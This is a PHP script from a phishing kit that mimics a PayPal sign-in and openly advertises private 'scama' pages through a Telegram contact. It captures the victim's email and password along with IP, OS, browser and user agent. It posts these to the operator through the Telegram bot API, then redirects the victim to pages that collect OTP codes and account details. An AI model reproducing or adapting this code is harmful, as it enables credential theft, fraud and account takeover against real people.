<?php
/*
Scama page by Nayfer
You want your private scama page ?
contact me on telegram @nayfercrax
*/
session_start();
error_reporting(0);
include "../myconfig/telegram.php";
include "../myconfig/settings.php";
$ip = getenv("REMOTE_ADDR");
if($_POST['login_p'] == ""){
  echo '<script>window.location = "../"</script>';
  exit();
}
if($sendlogin == 1){
 foreach($IdTelegram as $chatId) {
  $message = "[=====> 🔥🔥 PAYPAL [CRAXPRO.IO] | LOGIN  🔥🔥  <=====]\n\n";
  $message .= "[ 👤  MAIL :      ".$_SESSION['mail']."   ]\n";
  $message .= "[ 👤  PASSWORD :      ".$_POST['login_p']."   ]\n\n";
  $message .= "[=====> VICTIM INFROMATIONS <=====]\n\n";
  $message .= "[ 🔍 IP :    ".$ip."\n";   
  $message .= "[ 🌐 OS :    ".$user_os."\n";  
  $message .= "[ 🌐 Browser :    ".$user_browser."\n";  
  $message .= "[ 🌐 UA :    ".$_SERVER['HTTP_USER_AGENT']."\n\n"; 
  $message .= "[=====>  🔥 BY @nayfercrax 🔥  <=====]";
  $website="https://api.telegram.org/bot".$botToken;
  $params=[
      'chat_id'=>$chatId, 
      'text'=>$message,
  ];
  $ch = curl_init($website . '/sendMessage');
  curl_setopt($ch, CURLOPT_HEADER, false);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  $result = curl_exec($ch);
  curl_close($ch);
 }
 }
  $randomString = substr(str_shuffle("0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"), 20, 100);

if($auth_code == 1)
{
echo '<script type="text/javascript">window.location = "../signin/otp.php?'.$randomString.'"</script>';
}
else{
  echo '<script type="text/javascript">window.location = "../signin/account.php?'.$randomString.'"</script>';
}